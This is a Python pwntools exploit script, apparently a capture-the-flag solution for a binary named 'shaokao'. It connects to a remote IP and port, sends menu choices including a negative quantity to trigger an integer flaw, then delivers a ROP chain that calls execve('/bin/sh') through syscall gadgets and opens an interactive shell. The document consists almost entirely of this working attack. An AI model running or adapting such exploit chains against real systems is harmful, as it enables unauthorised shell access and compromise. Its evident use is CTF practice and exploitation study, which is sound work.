from pwn import * 
from pwn import p64


debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./shaokao")
    
else:
    host = "47.95.212.224"
    r = connect(host,45323)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x00401571')
    gdb.attach(r)
    pause()
    pass


elf = ELF('./shaokao')
pop_rdi = 0x40264f
pop_rdi= 0x40264f
pop_rsi = 0x40a67e
pop_rax= 0x458827
pop_rdx_rbx = 0x4a404b
syscall = 0x0402404
name = elf.sym['name']

payload =  b'/bin/sh'.ljust(0x28, b'\x00') + p64(pop_rdi) + p64(name) + p64(pop_rax) + p64(59) + p64(pop_rdx_rbx) + p64(0)*2   + p64(pop_rsi) + p64(0)  + p64(syscall)
                                                                        #调用号59 execve
r.sendline(b'1')
time.sleep(0.1)
r.sendline(b'1')
time.sleep(0.1)
r.sendline(b'-1000000')
time.sleep(0.1)
r.sendline(b'4')
time.sleep(0.1)
r.sendline(b'5')
time.sleep(0.1)
r.sendline(payload)
r.interactive()
